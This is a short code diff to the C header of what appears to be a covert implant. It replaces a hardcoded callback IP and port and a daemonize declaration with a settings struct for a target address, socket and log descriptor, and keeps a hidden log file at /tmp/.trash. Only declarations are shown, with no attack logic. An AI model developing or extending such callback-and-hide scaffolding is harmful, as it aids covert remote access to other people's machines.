@@ -17,18 +17,27 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
-// TODO replace perror with a wrappper around log or write to /dev/null
-#define KILL(x) { perror(x); _exit(1); }
+typedef struct bs_setting_s {
+    int sockfd;
+    int logfd;
+    char target_ip[128];
+    char target_port[128];
+} settings_t;
+
+static settings_t g_settings = {
+    .logfd = -1,
+    .sockfd = -1,
+    .target_port = {0},
+    .target_ip = {0},
+};
+
+#define KILL(x) { __log(x); flush(); }
 
 // setup.c
-void daemonize(void);
 void init(void);
+void flush(void);
+void __log(char const *);
 
 #define LOG_PATH ("/tmp/.trash")
-#define CALLBACK_IP ("192.168.1.69")
-#define CALLBACK_PORT ("6969")
-
-static int g_sockfd = -1;
-static int g_logfd = -1;
 
 #endif // SETUP_H
